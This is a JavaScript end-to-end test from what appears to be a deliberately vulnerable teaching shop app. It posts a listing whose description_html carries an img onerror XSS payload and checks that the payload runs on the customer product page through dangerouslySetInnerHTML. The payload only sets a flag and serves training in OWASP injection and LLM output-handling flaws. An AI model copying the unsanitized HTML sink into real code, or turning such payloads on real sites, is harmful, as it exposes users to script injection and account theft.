/**
 * @intentional-vulnerability xss-stored-listing
 * @intentional-vulnerability llm05-improper-output
 * @teaches OWASP-Web:A03
 * @teaches OWASP-LLM:LLM05
 * @location agent-host/agents/listing/tools/create.js
 * @location client/src/pages/secureshop/pages/Product.jsx
 *
 * Puppeteer E2E — merchant creates a listing carrying an XSS payload in
 * description_html; a customer visits the product page and the payload
 * executes (via dangerouslySetInnerHTML), setting window.__pwned=true.
 *
 * The e2eServer fixture stubs the merchant listing-create API so we can
 * prove the sink without booting the full agent-host.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { bootE2eServer, launchE2eBrowser } = require('../../fixtures/e2eServer.js');

test('e2e/xss-stored-product: merchant listing description_html executes on customer product page', {timeout:90000}, async t => {
  const server = await bootE2eServer({test:t});
  const {browser,close:closeBrowser} = await launchE2eBrowser(t,server);
  try {
    // ---- Step 1: merchant creates the poisoned listing ------------------
    // We hit the stubbed API directly. Real merchant UI is deep — the
    // vulnerability is that the API accepts raw HTML.
    const payload = `<img src="x" onerror="window.__pwned=true">`;
    const createResp = await fetch(`${server.baseUrl}/api/secureshop/merchant/listings`, {
      signal: AbortSignal.timeout(10000),
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        name: 'E2E Poisoned Listing',
        description: 'Baseline text.',
        description_html: payload,
        price: 42.00,
      }),
    });
    assert.equal(createResp.status, 200);
    const { product_id } = await createResp.json();
    assert.ok(product_id, 'product id returned');

    // ---- Step 2: customer visits the product page ---------------------
    // Wave 2A wrapped /secureshop/v2/* in <RequireAuth>. Seed the v2 auth
    // token in localStorage BEFORE navigation so the AuthContext hydrates as
    // student_c and doesn't redirect to /login.
    const page = await browser.newPage();
    await page.evaluateOnNewDocument(() => {
      try { localStorage.setItem('secureshop_v2_token', 'e2e:student_c'); } catch {}
    });
    // Puppeteer will throw if the img errors, but that's the whole point —
    // the payload IS the error handler. Just navigate.
    await page.goto(`${server.baseUrl}/secureshop/v2/product/${product_id}`, {
      waitUntil: 'networkidle0',
      timeout: 30000,
    });

    // Wait for the product body to render
    await page.waitForFunction(
      () => document.querySelector('.ss-display'),
      { timeout: 15000 },
    );

    // Give the onerror handler a beat to fire once the img tag mounts
    await new Promise(r => setTimeout(r, 500));

    // ---- Step 3: assert the XSS handler set the flag ------------------
    const pwned = await page.evaluate(() => window.__pwned === true);
    assert.equal(pwned, true, 'window.__pwned set by onerror — stored XSS fired end-to-end');
  } finally {
    try { await closeBrowser(); } finally { await server.close(); }
  }
});
